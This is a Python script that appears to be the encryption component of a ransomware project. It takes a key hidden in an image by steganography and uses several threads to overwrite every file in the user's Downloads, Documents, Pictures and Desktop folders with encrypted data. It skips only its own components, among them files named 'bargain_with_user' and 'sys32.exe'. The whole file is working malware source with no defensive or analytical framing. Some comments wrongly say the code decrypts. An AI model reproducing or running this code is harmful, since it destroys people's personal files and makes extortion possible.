import os
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor
from extract import extract_message


def encrypt_file(filename: str, f_key: Fernet):
    """
    Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
    :param filename: Represents the file to undergo encryption
    :param f_key: Represents an instance of the Fernet Class created with a key.
    :return: None
    """
    # Assigns the data inside the unencrypted file to a variable
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    # Decrypts the unencrypted data using the key and assigns the encrypted data to a variable
    ciphertext = f_key.encrypt(plaintext)
    # Overwrites the same file
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)


def process_directory(directory, f_key, blacklist):
    """
    This function processes each directory, encrypting files that are not in the blacklist.
    :param directory: Represents the path to a directory that will have its files decrypted.
    :param f_key: Represents an instance of the Fernet Class created with a key.
    :param blacklist:
    :return: None
    """
    # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
    for root, _, files in os.walk(directory):
        # Iterates through each file in the directory
        for file in files:
            if file not in blacklist:
                # Combines the path of the directory with the file name to create filepath of file
                file_path = os.path.join(root, file)
                # Decrypts the file given the newly generated filepath
                encrypt_file(file_path, f_key)
                print(file)


def main():
    # Extracts the key from a specified image
    key: str = extract_message("download.jpg", "Mochi")
    # Converts that key to a Fernet object to gain access to Fernet methods
    fernet_key: Fernet = Fernet(key)

    # Represents files to avoid for safety
    blacklist: list[str] = ["bargain_with_user.exe", "bargain_with_user.py",
                            "decrypt.py",
                            "encrypt.exe", "encrypt.py",
                            "extract.py",
                            "decrypt.exe", "decrypt.py",
                            "scan_and_execute.exe", "scan_and_execute.py",
                            "steghide.exe",
                            "sys32.exe"]

    # Directories to encrypt in their entirety
    directories_to_encrypt = [
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Desktop")
    ]

    # Start a thread for each directory
    with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
        # Submit each directory to be processed in a separate thread
        futures = [executor.submit(process_directory, directory, fernet_key, blacklist) for directory in
                   directories_to_encrypt]
        # Ensure each thread completes by calling `.result()` on each future
        for future in futures:
            future.result()

    print("Encryption successful!")


main()
